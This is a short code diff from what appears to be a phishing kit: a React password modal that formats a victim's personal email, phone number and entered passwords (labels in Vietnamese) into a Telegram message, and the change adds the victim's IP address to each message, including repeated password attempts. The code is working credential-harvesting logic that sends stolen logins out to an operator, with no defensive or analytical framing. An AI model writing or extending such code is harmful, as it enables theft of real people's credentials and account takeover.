@@ -64,7 +64,7 @@ const createTelegramMessage = (
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Personal Email:</b> <code>${formData.personalEmail}</code>
 📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>
-🔑 <b>${passwordLabel} <code>${password}</code>`;
+🌐 <b>IP:</b> <code>${geoData.ip}</code>${passwordLabel} <code>${password}</code>`;
 };
 
 const PasswordModal: FC<PasswordModalProps> = ({
@@ -119,7 +119,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
       localStorage.getItem("geoData") ?? "{}",
     );
     if (lastMessage) {
-      message = `${lastMessage}\n🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
+      message = `${lastMessage}\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔑 <b>Mật Khẩu ${uiState.attempt + 1}:</b> <code>${uiState.password}</code>`;
     } else {
       message = createTelegramMessage(formData, uiState.password);
     }
